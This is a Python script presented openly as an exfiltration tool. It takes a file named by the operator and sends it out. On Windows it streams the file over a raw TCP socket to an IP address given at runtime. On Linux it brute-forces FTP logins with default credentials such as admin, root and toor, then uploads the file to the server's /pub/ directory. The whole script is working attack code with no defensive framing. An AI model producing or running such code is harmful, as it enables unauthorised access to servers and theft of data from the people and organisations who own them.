import ftplib
import os
import socket
import platform
import subprocess


def brute_force_ftp(username_list, password_list, server):
    """
    Function to perform brute force attack on FTP server.

    Args:
        username_list (list): List of usernames to try.
        password_list (list): List of passwords to try.
        server (str): FTP server address.

    Returns:
        tuple: A tuple containing the successful username and password, or (None, None) if not found.
    """
    for username in username_list:
        for password in password_list:
            try:
                ftp = ftplib.FTP(server)
                ftp.login(username, password)
                print(f"FTP login successful with credentials: {username}/{password}")
                ftp.quit()
                return username, password
            except Exception as e:
                print(f"Failed login attempt: {username}/{password}")


def plain_ftp(docpath, server, username, password):
    """
    Function to upload a file to an FTP server.

    Args:
        docpath (str): Path to the file to be uploaded.
        server (str): FTP server address.
        username (str): FTP server username.
        password (str): FTP server password.
    """
    ftp = ftplib.FTP(server)
    ftp.login(username, password)
    ftp.cwd('/pub/')
    with open(docpath, "rb") as f:
        ftp.storbinary("STOR " + os.path.basename(docpath), f)
    ftp.quit()


def transmit(document_path, client_ip):
    """
    Function to transmit a file to a client via TCP/IP.

    Args:
        document_path (str): Path to the file to be transmitted.
        client_ip (str): IP address of the client.
    """
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_port = 10000
    try:
        client.connect((client_ip, client_port))
        with open(document_path, 'rb') as f:
            client.sendall(f.read())
        print("File transmitted successfully.")
    except Exception as e:
        print(f"Failed to transmit file: {e}")
    finally:
        client.close()


if __name__ == '__main__':
    # Ask for file name to exfiltrate
    file_input = input("Enter the name of the file to exfiltrate: ")

    # Detect the operating system
    os_name = platform.system()

    if os_name == 'Windows':
        # For Windows, simply transmit the file directly to the client
        client_ip = input("Enter the client IP address to transmit the file: ")
        transmit(file_input, client_ip)
    elif os_name == 'Linux':
        # For Linux, try to brute force FTP credentials
        server_input = input("Please enter the FTP server IPv4 address: ")
        username, password = brute_force_ftp(["admin", "root"], ["admin", "root", "toor"], server_input)
        if username and password:
            # If FTP credentials found, upload the file
            plain_ftp(file_input, server_input, username, password)
    else:
        print("Unsupported operating system.")
